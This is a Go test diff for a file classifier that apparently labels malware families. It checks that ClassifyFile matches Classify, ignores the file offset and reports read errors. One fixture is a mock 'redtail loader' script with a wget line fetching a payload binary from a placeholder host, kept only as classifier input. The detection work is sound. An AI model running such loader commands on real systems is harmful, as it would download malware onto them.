@@ -329,6 +329,87 @@ func TestClassifyLargeELFKeepsArchAndStatic(t *testing.T) {
 	}
 }
 
+// ClassifyFile is what a pinned caller (the campaign worker) uses: it must
+// give Classify's answer for the same bytes, parse a >256 KiB ELF from the
+// open descriptor (elf.NewFile, not a path re-open), and not depend on the
+// file's current offset.
+func TestClassifyFileMatchesClassify(t *testing.T) {
+	dir := t.TempDir()
+	cases := map[string][]byte{
+		"big-static": largeStaticELF64(elf.EM_X86_64),
+		"redtail.sh": []byte("#!/bin/bash\n# redtail loader\nwget http://x/redtail.x86_64\n"),
+	}
+	for name, raw := range cases {
+		p := filepath.Join(dir, name)
+		if err := os.WriteFile(p, raw, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		want, err := Classify(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		f, err := os.Open(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := f.Seek(17, 0); err != nil { // offset must not matter
+			t.Fatal(err)
+		}
+		got, err := ClassifyFile(f)
+		f.Close()
+		if err != nil {
+			t.Fatal(err)
+		}
+		if got.Family != want.Family || got.FileKind != want.FileKind || strings.Join(got.Tags, ",") != strings.Join(want.Tags, ",") {
+			t.Fatalf("%s: ClassifyFile %+v, Classify %+v", name, got, want)
+		}
+	}
+	if c, _ := Classify(filepath.Join(dir, "big-static")); !containsTag(c.Tags, "static") || !containsTag(c.Tags, "x86-64") {
+		t.Fatalf("large ELF lost structural tags: %v", c.Tags)
+	}
+}
+
+// ClassifyFile reports a real read error instead of classifying an empty or
+// partial head (the campaign worker memoises families, so a failed read must
+// not become family ""). Classify(path) keeps ignoring read errors for its
+// share/intel callers: a directory opens but fails every read (EISDIR).
+func TestClassifyFileReturnsReadErrors(t *testing.T) {
+	p := filepath.Join(t.TempDir(), "s.sh")
+	if err := os.WriteFile(p, []byte("#!/bin/sh\necho x\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	f, err := os.Open(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	f.Close()
+	if c, err := ClassifyFile(f); err == nil || c.FileKind != "" || c.Family != "" || len(c.Tags) != 0 {
+		t.Fatalf("closed file: %+v, %v", c, err)
+	}
+	dir := t.TempDir()
+	d, err := os.Open(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer d.Close()
+	if _, err := ClassifyFile(d); err == nil {
+		t.Fatal("unreadable file classified without an error")
+	}
+	c, err := Classify(dir)
+	if err != nil || c.FileKind != "unknown" {
+		t.Fatalf("Classify must keep ignoring read errors: %+v, %v", c, err)
+	}
+	// A short file is not a read error.
+	g, err := os.Open(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer g.Close()
+	if c, err := ClassifyFile(g); err != nil || !containsTag(c.Tags, "script") {
+		t.Fatalf("short file: %+v, %v", c, err)
+	}
+}
+
 // TestFirstLineHandlesEmpty makes sure firstLine() doesn't panic on
 // odd inputs (the classifier shells out to it on every script).
 func TestFirstLineHandlesEmpty(t *testing.T) {
